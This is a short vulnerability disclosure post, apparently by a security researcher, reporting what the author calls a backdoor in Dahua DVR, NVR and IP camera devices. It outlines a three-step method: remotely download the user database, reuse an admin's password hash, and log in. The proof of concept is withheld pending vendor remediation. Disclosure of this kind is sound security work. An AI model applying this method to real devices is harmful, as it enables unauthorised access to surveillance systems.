I'm speechless, and almost don't know what I should write... I (hardly) can't believe
what I have just found.
I have just discovered (to what I strongly believe is backdoor) in Dahua DVR/NVR/IPC
and possible all their clones.
Since I am convinced this is a backdoor, I have my own policy to NOT notify the
vendor before the community.
(I simply don't want to listen on their poor excuses, their tryings to keep me silent
for informing the community)
In short:
You can delete/add/change name on the admin users, you change password on the admin
users - this backdoor simply don't
care about that!
It uses whatever names and passwords you configuring - by simply downloading the full
user database and use your own
credentials!
This is so simple as:
1. Remotely download the full user database with all credentials and permissions
2. Choose whatever admin user, copy the login names and password hashes
3. Use them as source to remotely login to the Dahua devices
This is like a damn Hollywood hack, click on one button and you are in...

Below PoC you will find here: [Dahua asked me to remove the PoC, will be re-posted
April 5 2017 â€“ To give them 30 days
for remediation]
Please have understanding of the quick hack of the PoC, I'm sure it could be done
better.
Have a nice day
